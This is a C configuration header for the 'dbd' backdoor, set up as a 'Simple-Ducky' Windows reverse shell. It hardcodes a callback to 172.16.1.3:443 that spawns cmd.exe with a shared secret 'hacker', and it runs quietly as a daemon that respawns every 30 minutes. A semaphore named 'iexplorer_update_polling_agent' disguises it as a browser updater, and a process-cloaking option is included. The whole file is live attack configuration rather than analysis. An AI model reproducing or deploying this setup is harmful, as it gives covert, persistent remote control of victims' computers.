/* this file is used to hardcode a behaviour into dbd.
 * to use this feature, uncomment one of the examples below,
 * or type in your own. when finished, recompile dbd.
 */

/* Simple-Ducky Windows Reverse Shell Settings*/

#define HOST "172.16.1.3"
#define PORT 443
#define BINDHOST NULL
#define SOURCE_PORT 0
#define DOLISTEN 0
#define EXECPROG "cmd.exe"
#define CONVERT_TO_CRLF 0
#define ENCRYPTION 1
#define SHARED_SECRET "hacker"
#define RESPAWN_ENABLED 1
#define RESPAWN_INTERVAL 1800
#define QUIET 1
#define VERBOSE 0
#define DAEMONIZE 1
#define RUN_ONLY_ONE_INSTANCE 0
#define INSTANCE_SEMAPHORE "iexplorer_update_polling_agent"

/* Romulan Cloaking Technology - MUST DEFINE ALL OPTIONS IN THIS HEADER
 * When set to 1, this option will change argv[0] (and therefore the process's
 * entry in ps, netstat, etc) to "bash"
 * WARNING: Will remove other command-line variables, so only use it when hard
 * coding all variables into this header.
 */
#define CLOAK 0

/* "chat" options */

#define HIGHLIGHT_INCOMING 0
#define HIGHLIGHT_PREFIX "\x1b[0;32m"
#define HIGHLIGHT_SUFFIX "\x1b[0m"
#define SEPARATOR_BETWEEN_PREFIX_AND_DATA ": "

/* win32 specific options: */

#define RUN_ONLY_ONE_INSTANCE 0
#define INSTANCE_SEMAPHORE "durandal_bd_semaphore"

